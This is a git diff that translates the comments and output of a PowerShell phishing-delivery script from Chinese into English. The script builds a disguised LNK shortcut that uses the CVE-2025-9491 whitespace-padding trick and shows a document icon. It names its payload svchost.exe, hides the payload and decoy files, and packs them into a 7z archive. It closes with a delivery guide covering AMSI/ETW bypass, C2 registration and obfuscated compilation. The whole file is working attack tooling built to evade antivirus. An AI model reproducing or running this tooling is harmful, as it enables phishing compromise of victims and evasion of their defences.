@@ -1,15 +1,15 @@
-# Fish LNK钓鱼投递脚本 v2 (免杀加固版)
-# 核心改进:
-#   1. CVE-2025-9491: LNK参数260字符后隐藏真实命令
-#   2. 消除cmd.exe/bat中间层: LNK → 直接执行payload + 诱饵
-#   3. 目录名无害化: 不用__MACOSX（已知IOC）
-#   4. payload重命名为无害名称
-# 用法: .\phish.ps1 -ExePath .\fish.exe -DecoyName "报告.pdf" -IconType "pdf"
+# Fish LNK Phishing Script v2 (Evasion Hardened)
+# Improvements:
+#   1. CVE-2025-9491: LNK args hidden after 260-char padding
+#   2. No cmd.exe/bat middle layer: LNK -> payload directly
+#   3. Harmless dir name (.assets, NOT __MACOSX which is known IOC)
+#   4. Payload renamed to svchost.exe
+# Usage: .\phish.ps1 -ExePath .\fish.exe -DecoyName "report.pdf" -IconType "pdf"
 
 param(
     [Parameter(Mandatory=$true)]
     [string]$ExePath,
-    [string]$DecoyName = "报告.pdf",
+    [string]$DecoyName = "report.pdf",
     [string]$DecoyContent = "",
     [string]$IconType = "pdf",
     [string]$OutputName = "report",
@@ -20,66 +20,57 @@ param(
 $ErrorActionPreference = "Stop"
 
 if (-not (Test-Path $ExePath)) {
-    Write-Host "[!] payload不存在: $ExePath" -ForegroundColor Red
+    Write-Host "[!] Payload not found: $ExePath" -ForegroundColor Red
     exit 1
 }
 
 $workDir = Join-Path $env:TEMP "fish_lnk_$(Get-Random)"
 
-Write-Host "[+] Fish LNK钓鱼工具 v2 (免杀加固)" -ForegroundColor Cyan
-Write-Host "[+] 工作目录: $workDir"
+Write-Host "[+] Fish LNK Phishing Tool v2 (Evasion Hardened)" -ForegroundColor Cyan
+Write-Host "[+] Work dir: $workDir"
 
-# ============================================
-# 第1步: 创建目录 + 复制文件
-# ============================================
-Write-Host "[+] 创建目录结构..."
+# Step 1: Create dirs + copy files
+Write-Host "[+] Creating directory structure..."
 
 $resPath = Join-Path $workDir $ResDir
 New-Item -ItemType Directory -Path $resPath -Force | Out-Null
 
-# payload重命名（无害名称）
 $payloadName = "svchost.exe"
 Copy-Item $ExePath (Join-Path $resPath $payloadName)
 
-# 诱饵文件
 $decoyPath = Join-Path $resPath $DecoyName
 if ($DecoyContent -ne "") {
     Set-Content -Path $decoyPath -Value $DecoyContent -Encoding UTF8
 } else {
-    # 默认PDF内容（占位，实际替换为真实PDF）
     $defaultDecoy = "Fish C2 Decoy Document - Replace with real PDF"
     Set-Content -Path $decoyPath -Value $defaultDecoy -Encoding UTF8
 }
 
-Write-Host "[+] 目录结构:" -ForegroundColor Green
-Write-Host "  $OutputName.lnk  (伪装为 $IconType)"
+Write-Host "[+] Directory structure:" -ForegroundColor Green
+Write-Host "  $OutputName.lnk  (icon: $IconType)"
 Write-Host "  $ResDir\"
-Write-Host "    ├── $DecoyName (诱饵)"
-Write-Host "    └── $payloadName (payload)"
+Write-Host "    |-- $DecoyName (decoy)"
+Write-Host "    |-- $payloadName (payload)"
 
-# ============================================
-# 第2步: 生成LNK（CVE-2025-9491加固）
-# ============================================
-Write-Host "[+] 生成LNK快捷方式 (CVE-2025-9491参数隐藏)..."
+# Step 2: Generate LNK (CVE-2025-9491 hardened)
+Write-Host "[+] Generating LNK shortcut (CVE-2025-9491 arg hiding)..."
 
 $lnkPath = Join-Path $workDir "$OutputName.lnk"
 
 $shell = New-Object -ComObject WScript.Shell
 $shortcut = $shell.CreateShortcut($lnkPath)
 
-# 关键改进：LNK目标指向payload本身（不再经过cmd.exe/bat）
-# payload内部已集成: AMSI bypass → ETW bypass → 释放PDF → C2上线
+# Key: LNK targets payload directly (no cmd.exe/bat layer)
+# Payload has built-in: AMSI bypass -> ETW bypass -> drop PDF -> C2 register
 $shortcut.TargetPath = Join-Path $ResDir $payloadName
 
-# CVE-2025-9491: 260字符空白填充后隐藏参数
-# Properties对话框只显示前260字符，之后的内容不可见
-# 这里参数为空（payload内部处理PDF释放），但填充空格防止AV解析
-$padding = " " * 260  # 260字符空白填充
+# CVE-2025-9491: 260-char whitespace padding hides args from Properties dialog
+$padding = " " * 260
 $shortcut.Arguments = $padding
 
 $shortcut.WindowStyle = 7  # SW_SHOWMINNOACTIVE
 
-# 图标映射（无害化）
+# Icon map (harmless system icons)
 $iconMap = @{
     "pdf"    = "$env:SystemRoot\System32\shell32.dll,68"
     "txt"    = "$env:SystemRoot\System32\shell32.dll,70"
@@ -97,15 +88,13 @@ if ($iconMap.ContainsKey($IconType)) {
 $shortcut.Description = $DecoyName
 $shortcut.Save()
 
-Write-Host "[+] LNK已生成: $lnkPath" -ForegroundColor Green
-Write-Host "    目标: $ResDir\$payloadName (直接指向payload,无中间层)"
-Write-Host "    参数: 260字符空白填充 (CVE-2025-9491)"
-Write-Host "    图标: $IconType"
+Write-Host "[+] LNK generated: $lnkPath" -ForegroundColor Green
+Write-Host "    Target: $ResDir\$payloadName (direct, no cmd.exe layer)"
+Write-Host "    Args: 260-char padding (CVE-2025-9491)"
+Write-Host "    Icon: $IconType"
 
-# ============================================
-# 第3步: 设置隐藏属性
-# ============================================
-Write-Host "[+] 设置隐藏属性..."
+# Step 3: Set hidden attributes
+Write-Host "[+] Setting hidden attributes..."
 
 $resItem = Get-Item $resPath -Force
 $resItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System -bor [System.IO.FileAttributes]::Directory
@@ -114,12 +103,10 @@ Get-ChildItem $resPath -Recurse -Force | ForEach-Object {
     $_.Attributes = $_.Attributes -bor [System.IO.FileAttributes]::Hidden
 }
 
-Write-Host "[+] 隐藏属性已设置" -ForegroundColor Green
+Write-Host "[+] Hidden attributes set" -ForegroundColor Green
 
-# ============================================
-# 第4步: 7-Zip打包
-# ============================================
-Write-Host "[+] 打包压缩文件..."
+# Step 4: 7-Zip packaging
+Write-Host "[+] Packaging..."
 
 $output7z = Join-Path (Get-Location) "$OutputName.7z"
 $outputZip = Join-Path (Get-Location) "$OutputName.zip"
@@ -139,43 +126,39 @@ if ($sevenZip) {
     Push-Location $workDir
     & $sevenZip a -r $output7z "." | Out-Null
     Pop-Location
-    Write-Host "[+] 7z压缩包: $output7z" -ForegroundColor Green
+    Write-Host "[+] 7z archive: $output7z" -ForegroundColor Green
 } else {
     Compress-Archive -Path "$workDir\*" -DestinationPath $outputZip -Force
-    Write-Host "[+] ZIP压缩包: $outputZip (警告:可能丢失隐藏属性)" -ForegroundColor Yellow
+    Write-Host "[+] ZIP archive: $outputZip (warning: may lose hidden attrs)" -ForegroundColor Yellow
 }
 
-# ============================================
-# 第5步: 清理
-# ============================================
+# Step 5: Cleanup
 if (-not $KeepWorking) {
     Get-ChildItem $resPath -Recurse -Force | ForEach-Object {
         $_.Attributes = [System.IO.FileAttributes]::Normal
     }
     $resItem.Attributes = [System.IO.FileAttributes]::Normal
     Remove-Item $workDir -Recurse -Force
-    Write-Host "[+] 工作目录已清理" -ForegroundColor Green
+    Write-Host "[+] Work dir cleaned" -ForegroundColor Green
 } else {
-    Write-Host "[*] 工作目录保留: $workDir" -ForegroundColor Yellow
+    Write-Host "[*] Work dir kept: $workDir" -ForegroundColor Yellow
 }
 
-# ============================================
-# 投递指引
-# ============================================
+# Delivery guide
 Write-Host ""
-Write-Host "========== 投递指引 ==========" -ForegroundColor Cyan
+Write-Host "========== Delivery Guide ==========" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "攻击链: LNK → payload.exe (内部: AMSI/ETW bypass → 释放PDF → C2上线)"
+Write-Host "Chain: LNK -> payload.exe (AMSI/ETW bypass -> drop PDF -> C2)"
 Write-Host ""
-Write-Host "免杀加固:"
-Write-Host "  - 无cmd.exe/bat中间层 (消除LNK→cmd检测特征)"
-Write-Host "  - CVE-2025-9491参数隐藏 (260字符空白填充)"
-Write-Host "  - payload重命名svchost.exe"
-Write-Host "  - 目录名无害化(.assets, 不用__MACOSX)"
-Write-Host "  - payload内集成AMSI+ETW bypass"
+Write-Host "Evasion:"
+Write-Host "  - No cmd.exe/bat middle layer"
+Write-Host "  - CVE-2025-9491 arg hiding (260-char padding)"
+Write-Host "  - Payload renamed svchost.exe"
+Write-Host "  - Dir name .assets (NOT __MACOSX)"
+Write-Host "  - AMSI + ETW bypass built into payload"
 Write-Host ""
-Write-Host "注意事项:"
-Write-Host "  - payload必须集成PDF释放逻辑(//go:embed decoy.pdf)"
-Write-Host "  - 使用 garble -tiny -literals -controlflow 编译payload"
-Write-Host "  - 7z格式保留隐藏属性, ZIP可能失效"
-Write-Host "================================" -ForegroundColor Cyan
+Write-Host "Notes:"
+Write-Host "  - Payload must have //go:embed decoy.pdf"
+Write-Host "  - Build with: garble -tiny -literals -controlflow"
+Write-Host "  - 7z preserves hidden attrs, ZIP may not"
+Write-Host "======================================" -ForegroundColor Cyan
